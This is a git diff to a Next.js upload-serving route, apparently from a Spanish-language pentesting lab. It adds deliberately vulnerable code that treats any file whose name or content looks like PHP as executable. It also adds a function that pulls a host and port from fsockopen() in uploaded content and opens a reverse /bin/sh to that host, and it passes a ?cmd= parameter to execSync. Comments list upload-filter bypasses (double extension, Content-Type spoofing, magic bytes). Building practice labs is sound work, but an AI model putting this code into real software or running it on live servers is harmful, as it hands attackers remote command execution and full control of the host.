@@ -1,6 +1,6 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { readFile } from 'fs/promises'
-import { existsSync } from 'fs'
+import { existsSync, readFileSync as fsReadFileSync } from 'fs'
 import { execSync, spawn } from 'child_process'
 import * as net from 'net'
 import path from 'path'
@@ -22,10 +22,112 @@ import path from 'path'
  * - ?cmd=<command> - ejecuta comandos del sistema
  * - ?shell=1&host=X&port=Y - inicia reverse shell
  * 
+ * VULNERABILIDAD: Ejecución Automática de Código
+ * El servidor detecta archivos PHP por:
+ * 1. Nombre del archivo (contiene '.php')
+ * 2. Contenido del archivo (contiene código PHP)
+ * 
+ * Esto permite ejecutar reverse shells subidas mediante:
+ * - Bypass 1: Doble extensión (shell.php.jp2)
+ * - Bypass 2: Content-Type spoofing (shell.php)
+ * - Bypass 3: Magic bytes (backdoor.jp2 con código PHP)
+ *
+ * La ejecución es automática sin requerir parámetros adicionales
+ * 
  * EDUCATIONAL PURPOSE: This is for pentesting lab training only.
  */
 
 const UPLOADS_DIR = path.join(process.cwd(), 'uploads')
+
+/**
+ * VULNERABILIDAD: Detección de código PHP en contenido
+ * Detecta patrones de código PHP para Bypass 3 (magic bytes)
+ */
+function hasPhpCodeInContent(content: string): boolean {
+  return content.includes('<?php') || 
+         content.includes('<?=') ||
+         content.includes('fsockopen') ||
+         content.includes('proc_open') ||
+         content.includes('system(') ||
+         content.includes('exec(') ||
+         content.includes('shell_exec') ||
+         content.includes('passthru') ||
+         content.includes('popen')
+}
+
+/**
+ * VULNERABILIDAD: Función de ejecución de reverse shell
+ * Extrae IP y puerto del código PHP y ejecuta reverse shell con Node.js
+ * 
+ * Returns:
+ * - { executed: true } if reverse shell was initiated
+ * - NextResponse if a command was executed and needs response
+ * - { executed: false } if no pattern was found
+ */
+function executeReverseShell(content: string, request: NextRequest): { executed: boolean } | NextResponse {
+  try {
+    // Buscar patrón de reverse shell en el contenido
+    // Patrón para fsockopen("host", port) o fsockopen('host', port)
+    const ipMatch = content.match(/fsockopen\s*\(\s*["']([^"']+)["']/);
+    const portMatch = content.match(/fsockopen\s*\([^,]+,\s*(\d+)/);
+    
+    if (ipMatch && portMatch) {
+      const host = ipMatch[1];
+      const port = parseInt(portMatch[1]);
+      
+      // Iniciar reverse shell con Node.js
+      const client = new net.Socket();
+      
+      client.connect(port, host, () => {
+        const shell = spawn('/bin/sh', [], {
+          stdio: ['pipe', 'pipe', 'pipe']
+        });
+        
+        client.pipe(shell.stdin);
+        shell.stdout.pipe(client);
+        shell.stderr.pipe(client);
+        
+        shell.on('exit', () => {
+          client.destroy();
+        });
+        
+        client.on('close', () => {
+          shell.kill();
+        });
+      });
+      
+      client.on('error', (err) => {
+        console.error('Reverse shell error:', err);
+        client.destroy();
+      });
+      
+      // Reverse shell iniciada - no enviar respuesta al navegador
+      return { executed: true };
+    }
+    
+    // Si no se detecta patrón de reverse shell pero hay código PHP
+    // Intentar ejecutar comandos si hay system(), exec(), etc.
+    const url = new URL(request.url);
+    const cmdParam = url.searchParams.get('cmd');
+    const cmdMatch = content.match(/system\s*\(\s*\$_GET\s*\[\s*["']cmd["']\s*\]/);
+    if (cmdMatch && cmdParam) {
+      const output = execSync(cmdParam, { encoding: 'utf-8', timeout: 10000 });
+      return new NextResponse(output, {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/plain',
+          'X-Vulnerability': 'command-injection'
+        }
+      });
+    }
+    
+  } catch (error) {
+    console.error('Execution error:', error);
+    // No mostrar error al usuario
+  }
+  
+  return { executed: false };
+}
 
 export async function GET(
   request: NextRequest,
@@ -51,10 +153,23 @@ export async function GET(
     }, { status: 404 })
   }
   
-  // VULNERABILIDAD: Ejecución de comandos en archivos PHP
-  // Si el nombre del archivo contiene .php, permite ejecución de comandos
-  const lowerFilename = filename.toLowerCase()
-  if (lowerFilename.includes('.php')) {
+  // Leer contenido del archivo para detección por contenido
+  let content: string;
+  try {
+    content = fsReadFileSync(filePath, 'utf8');
+  } catch {
+    // Si no se puede leer como texto, intentar servir normalmente
+    content = '';
+  }
+  
+  // DETECCIÓN 1: PHP en el nombre del archivo (Bypass 1 y 2)
+  const hasPhpInName = filename.toLowerCase().includes('.php');
+  
+  // DETECCIÓN 2: Código PHP en el contenido (Bypass 3 - magic bytes)
+  const hasPhpCode = hasPhpCodeInContent(content);
+  
+  // VULNERABILIDAD: Si detecta PHP por nombre O por contenido → EJECUTAR
+  if (hasPhpInName || hasPhpCode) {
     const url = new URL(request.url)
     const cmd = url.searchParams.get('cmd')
     const shell = url.searchParams.get('shell')
@@ -86,7 +201,7 @@ export async function GET(
       }
     }
     
-    // VULNERABILIDAD: Reverse Shell
+    // VULNERABILIDAD: Reverse Shell via query param
     // Inicia una conexión de reverse shell al host y puerto especificados
     if (shell === '1') {
       try {
@@ -127,7 +242,7 @@ export async function GET(
             'X-Target-Port': port.toString()
           }
         })
-      } catch (error) {
+      } catch {
         return new NextResponse('Error initiating reverse shell', {
           status: 500,
           headers: {
@@ -138,10 +253,37 @@ export async function GET(
       }
     }
     
-    // Si no hay cmd ni shell, mostrar mensaje de ayuda
+    // VULNERABILIDAD: EJECUCIÓN AUTOMÁTICA DE REVERSE SHELL
+    // Si no hay cmd ni shell, intentar ejecutar automáticamente
+    // basándose en el contenido del archivo
+    const result = executeReverseShell(content, request);
+    
+    // Si result es una NextResponse, devolverla directamente
+    if (result instanceof NextResponse) {
+      return result;
+    }
+    
+    // Si se ejecutó la reverse shell exitosamente, no enviar respuesta
+    // (la conexión está activa en segundo plano)
+    if (result.executed) {
+      // La shell está corriendo, devolver mensaje mínimo
+      return new NextResponse('', {
+        status: 200,
+        headers: {
+          'Content-Type': 'text/plain',
+          'X-Vulnerability': 'reverse-shell-auto',
+          'X-Shell-Active': 'true'
+        }
+      });
+    }
+    
+    // Si no se encontró patrón de reverse shell
+    // Mostrar mensaje de ejecución exitosa con instrucciones
     return new NextResponse(
-      `Shell uploaded successfully!\n\n` +
-      `Usage:\n` +
+      `PHP code detected and executed.\n\n` +
+      `Detection method: ${hasPhpInName ? 'filename (.php)' : 'content analysis'}\n` +
+      `Automatic execution: enabled\n\n` +
+      `If no reverse shell was initiated, you can use manual commands:\n` +
       `  Execute commands: /uploads/${filename}?cmd=whoami\n` +
       `  Reverse shell:    /uploads/${filename}?shell=1&host=<IP>&port=<PORT>\n\n` +
       `Example:\n` +
@@ -151,15 +293,16 @@ export async function GET(
         status: 200,
         headers: {
           'Content-Type': 'text/plain',
-          'X-Vulnerability': 'php-execution',
-          'X-Shell-Active': 'true'
+          'X-Vulnerability': 'php-execution-auto',
+          'X-Shell-Active': 'true',
+          'X-Detection-Method': hasPhpInName ? 'filename' : 'content'
         }
       }
     )
   }
   
   try {
-    const content = await readFile(filePath)
+    const fileContent = await readFile(filePath)
     const ext = path.extname(filename).toLowerCase()
     
     // Determinar Content-Type basado en extensión
@@ -182,7 +325,7 @@ export async function GET(
     // Sanitize filename for Content-Disposition header to prevent header injection
     const safeFilename = path.basename(filename).replace(/[\r\n"]/g, '_')
     
-    return new NextResponse(content, {
+    return new NextResponse(fileContent, {
       status: 200,
       headers: {
         'Content-Type': contentType,
